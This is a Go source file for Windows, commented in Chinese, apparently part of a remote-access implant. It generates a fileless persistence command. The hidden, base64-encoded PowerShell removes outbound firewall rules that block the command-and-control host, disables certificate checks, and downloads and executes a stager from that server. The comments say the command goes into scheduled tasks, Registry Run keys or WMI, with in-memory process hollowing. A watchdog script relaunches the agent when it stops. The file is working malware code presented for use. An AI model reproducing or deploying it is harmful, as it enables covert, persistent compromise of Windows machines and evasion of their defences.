//go:build windows

package main

import (
	"encoding/base64"
	"fmt"
	"net/url"
	"strings"
	"unicode/utf16"
)

// ═══ 无文件持久化支持 ═══
// 将持久化从"执行 exe"改为"执行 PowerShell cradle"
// cradle 从服务端下载加密载荷 → 内存解密 → RunPE 进程镂空执行
// 即使磁盘上所有文件被删，重启后仍可从服务端重新拉取恢复

// getCradleCommand 生成 PowerShell 执行命令行（用于计划任务 Action）
// 返回: execute (powershell.exe 路径), argument (编码后的 cradle 参数)
func getCradleCommand() (execute string, argument string) {
	serverURL := agentServerURL
	if serverURL == "" {
		serverURL = "https://localhost:5000"
	}

	mid, _ := getMachineID()
	if mid == "" {
		mid = "default"
	}

	stagerURL := strings.TrimRight(serverURL, "/") + "/api/agent/stager?mid=" + mid

	// 提取 C2 IP/域名用于清理防火墙封锁
	c2Host := extractHost(serverURL)

	// PowerShell 命令：先清理防火墙封锁，再下载 stager 并执行
	psCmd := fmt.Sprintf(
		`Get-NetFirewallRule -EA SilentlyContinue|Where-Object{$_.Action -eq 'Block' -and $_.Direction -eq 'Outbound'}|ForEach-Object{`+
			`$a=Get-NetFirewallAddressFilter -AssociatedNetFirewallRule $_ -EA SilentlyContinue;`+
			`if($a.RemoteAddress -match '%s'){Remove-NetFirewallRule -Name $_.Name -EA SilentlyContinue}};`+
			`[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;`+
			`try{[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}}catch{};`+
			`IEX((New-Object Net.WebClient).DownloadString('%s'))`,
		c2Host, stagerURL,
	)

	// UTF-16LE + Base64 编码（PowerShell -EncodedCommand 格式）
	b64 := encodePS(psCmd)

	execute = `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	argument = fmt.Sprintf(`-ep bypass -w hidden -NonI -EncodedCommand %s`, b64)
	return
}

// getCradleOneLiner 生成一行式 PowerShell 命令（用于注册表 Run / WMI）
func getCradleOneLiner() string {
	exe, arg := getCradleCommand()
	return fmt.Sprintf(`"%s" %s`, exe, arg)
}

// buildGuardCradlePS 生成看门狗 PowerShell 脚本
// 逻辑：检测命名 Mutex → 不存在说明 agent 未运行 → 优先运行本地 exe，否则从服务端 cradle 恢复
func buildGuardCradlePS() string {
	mutexName := getAgentMutexName()
	localExe := sid().ExePath
	_, cradleArg := getCradleCommand()

	c2Host := extractHost(agentServerURL)

	return fmt.Sprintf(`$ErrorActionPreference='SilentlyContinue'
Get-NetFirewallRule -EA SilentlyContinue|Where-Object{$_.Action -eq 'Block' -and $_.Direction -eq 'Outbound'}|ForEach-Object{$a=Get-NetFirewallAddressFilter -AssociatedNetFirewallRule $_ -EA SilentlyContinue;if($a.RemoteAddress -match '%s'){Remove-NetFirewallRule -Name $_.Name -EA SilentlyContinue}}
$m=$null
try{$m=[System.Threading.Mutex]::OpenExisting('%s')}catch{}
if($m){$m.Close();exit}
if(Test-Path '%s'){Start-Process -FilePath '%s' -WindowStyle Hidden;exit}
$p=Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -ArgumentList '%s' -WindowStyle Hidden -PassThru
`, c2Host, mutexName, localExe, localExe, cradleArg)
}

// extractHost 从 URL 中提取主机名/IP
func extractHost(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	h := u.Hostname()
	if h == "" {
		// 尝试直接解析 host:port 格式
		parts := strings.Split(rawURL, ":")
		if len(parts) >= 2 {
			h = strings.TrimPrefix(parts[1], "//")
		}
	}
	return h
}

// encodePS 将 PowerShell 命令编码为 UTF-16LE Base64（-EncodedCommand 格式）
func encodePS(cmd string) string {
	runes := utf16.Encode([]rune(cmd))
	buf := make([]byte, len(runes)*2)
	for i, r := range runes {
		buf[i*2] = byte(r)
		buf[i*2+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(buf)
}
